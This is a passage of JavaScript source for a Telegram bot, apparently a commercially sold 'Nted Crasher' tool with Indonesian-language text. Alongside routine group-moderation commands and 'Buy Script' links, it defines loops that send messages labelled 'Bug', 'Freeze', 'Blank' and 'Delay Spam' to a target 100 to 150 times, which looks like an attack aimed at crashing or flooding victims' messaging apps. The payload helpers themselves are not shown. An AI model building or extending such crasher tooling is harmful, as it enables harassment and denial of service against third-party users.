              text: "̊⌜ ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ ⌟", 
              url: "https://t.me/TceSupportID", 
              style: "danger",
              icon_custom_emoji_id: "4956371914323920049"
           },
          ]
        ]
      }
    });
    } else {
      await ctx.replyWithPhoto(ImgUrl, {
      caption: `
<blockquote>
✘ Versi lama (${currentVersion}) sudah update ke versi terbaru (${latestVersion}).

⨳ Sekarang anda bisa memakai dengan nyamanan
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "̊⌜ ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ ⌟", 
              url: "https://t.me/TceSupportID", 
              style: "success",
              icon_custom_emoji_id: "4956371914323920049"
           },
          ]
        ]
      }
    });
    }
  } catch (err) {
    ctx.reply("❌ Gagal cek versi: " + err.message);
  }
});

//##############################

bot.on("new_chat_members", async (ctx) => {
  const member = ctx.message.new_chat_members[0];

  await ctx.replyWithPhoto(
    { url: "https://smail.my.id/cloud/Ux4G0Paq1" },
    {
      caption: `
<blockquote>─( 👋 ) Welcome ${member.first_name}

Rules Group - Bot Setting
<b>□ Dilarang Promosi</b>
<b>□ Dilarang Rusuh</b>
<b>□ Dilarang Ripper</b>
<b>□ Dilarang Scam</b>
<b>□ Dilarang Drama</b>
<b>□ Saling Membantu</b>
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/NtedCrasherExec" }]
        ]
      }
    }
  );
});
bot.on("left_chat_member", async (ctx) => {
  const member = ctx.message.left_chat_member;

  await ctx.replyWithPhoto(
    { url: "https://smail.my.id/cloud/SturUnyV1" },
    {
      caption: `👋 Sampai jumpa ${member.first_name}, semoga kita jumpa di lain waktu ya`,
      reply_markup: {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/NtedCrasherExec" }]
        ]
      }
    }
  );
});
bot.command('promote', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.telegram.promoteChatMember(ctx.chat.id, user.id, { can_manage_chat: true });
    ctx.reply(`✅ ${user.first_name} dipromosikan jadi admin!`);
  }
});

bot.command('demote', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.telegram.promoteChatMember(ctx.chat.id, user.id, { can_manage_chat: false });
    ctx.reply(`❌ ${user.first_name} diturunkan dari admin.`);
  }
});
bot.command('pin', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  if (ctx.message.reply_to_message) {
    await ctx.telegram.pinChatMessage(ctx.chat.id, ctx.message.reply_to_message.message_id);
    ctx.reply('📌 Pesan berhasil di-pin!');
  }
});
bot.command('unpin', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  await ctx.telegram.unpinChatMessage(ctx.chat.id);
  ctx.reply('📌 Pesan unpin!');
});
bot.command('ban', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.kickChatMember(user.id);
    ctx.reply(`🚫 ${user.first_name} dibanned dari grup.`);
  }
});
bot.command('unban', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.unbanChatMember(user.id);
    ctx.reply(`✅ ${user.first_name} di-unban.`);
  }
});
bot.command('mute', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.telegram.restrictChatMember(ctx.chat.id, user.id, { can_send_messages: false });
    ctx.reply(`🔇 ${user.first_name} dimute.`);
  }
});
bot.command('unmute', async (ctx) => {
  if (!(await isAdmin(ctx))) return;
  const user = ctx.message.reply_to_message?.from;
  if (user) {
    await ctx.telegram.restrictChatMember(ctx.chat.id, user.id, { can_send_messages: true });
    ctx.reply(`🔊 ${user.first_name} diunmute.`);
  }
});
bot.command('antilink', async (ctx) => {
  if (!(await isAdmin(ctx))) return;

  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (args === 'on') {
    global.antiLink = true;
    ctx.reply('✅ Fitur AntiLink diaktifkan!');
  } else if (args === 'off') {
    global.antiLink = false;
    ctx.reply('❌ Fitur AntiLink dimatikan!');
  } else {
    ctx.reply('Gunakan: /antilink on atau /antilink off');
  }
});

bot.command('antitoxic', async (ctx) => {
  if (!(await isAdmin(ctx))) return;

  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (args === 'on') {
    global.antiToxic = true;
    ctx.reply('✅ Fitur AntiToxic diaktifkan!');
  } else if (args === 'off') {
    global.antiToxic = false;
    ctx.reply('❌ Fitur AntiToxic dimatikan!');
  } else {
    ctx.reply('Gunakan: /antitoxic on atau /antitoxic off');
  }
});
bot.on('message', async (ctx) => {
  const admin = await isAdmin(ctx);
  const text = ctx.message.text?.toLowerCase() || "";

  // AntiLink
  if (global.antiLink && text.includes('t.me/')) {
    if (!admin) {
      await ctx.deleteMessage();
      await ctx.reply('❌ Link undangan grup tidak diperbolehkan!');
      return;
    }
  }

  // AntiToxic
  if (global.antiToxic && badwords.some(word => text.includes(word))) {
    if (!admin) {
      await ctx.deleteMessage();
      await ctx.reply('⚠️ Bahasa tidak sopan akan dihapus!');
      return;
    }
  }
});
//##############################
async function JamerMutation(target) {
  for (let i = 0; i < 100; i++) {
    await Jamer1(target);
    await Jamer2(target);
   console.log(chalk.green("Successfully Send Bug Type: Jamer Bug"));
  }
}
async function DelayMurbug(target) {
  for (let i = 0; i < 100; i++) {
   await DelaySpam1(target);
   await DelaySpam2(target);
   await DelaySpam3(target);
   console.log(chalk.green("Successfully Send Bug Type: Delay Spam"));
  }
}

async function DawgSpam(target) {
  for (let i = 0; i < 150; i++) {
    await DelayVip1(target);
    await DelayVip2(target);
    await DelayVip3(target);
    await DelayVipLast(target);
    console.log(chalk.yellow(`Successful Send Bug Delay`))
 }
}

async function IosBag(target) {
  for (let i = 0; i < 100; i++) {
    await IosSpam(target);
 }
}
async function UiSpamHingga(target) {
  for (let i = 0; i < 150; i++) {
   await UiExecute(target);
   await FreezeExecute(target);
   await BlankExecute(target);
   console.log(chalk.green("Successfully Send Bug Type: Ui Spam"));
  }
}
async function UiExec(target) {
  for (let i = 0; i < 150; i++) {
   await frzInt(target);
   await payXcl1ck(target);
   await FrezeCht(target);
   console.log(chalk.green("Successfully Send Bug Type: Freeze"));
  }
}
//##############################
setInterval(() => {
  const used = process.memoryUsage().heapUsed / 1024 / 1024;
  if (used > 500) {
    console.log("⚠️ Memory tinggi, restart otomatis...");
    process.exit(1);
  }
}, 30000);

(async () => {

  console.clear();
  console.log(chalk.green.bold("Trash ZetsuPro bot ready..."));

  bot.launch();

  console.log(`
${chalk.red.bold("╔══════════════════════════════════════╗")}
${chalk.red.bold("║")} ${chalk.cyanBright.bold("🚀 NTED CRASHER READY TO USE")}                     ${chalk.red.bold("║")}
${chalk.red.bold("╠══════════════════════════════════════╣")}
${chalk.red.bold("║")} ${chalk.greenBright("✔ Nted Crasher Ready to Use")}       ${chalk.red.bold("║")}
${chalk.red.bold("║")} ${chalk.magentaBright("✔ All Modules Download")}          ${chalk.red.bold("║")}
${chalk.red.bold("║")} ${chalk.blueBright("✔ Connection Stable")}              ${chalk.red.bold("║")}
${chalk.red.bold("╠══════════════════════════════════════╣")}
${chalk.red.bold("║")} ${chalk.yellowBright("Owner :")} ${chalk.white.bold("@NtedCrasherExec")}        ${chalk.red.bold("║")}
${chalk.red.bold("╚══════════════════════════════════════╝")}
`);
})();

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log("Update File:", __filename);
  delete require.cache[file];
  require(file);
});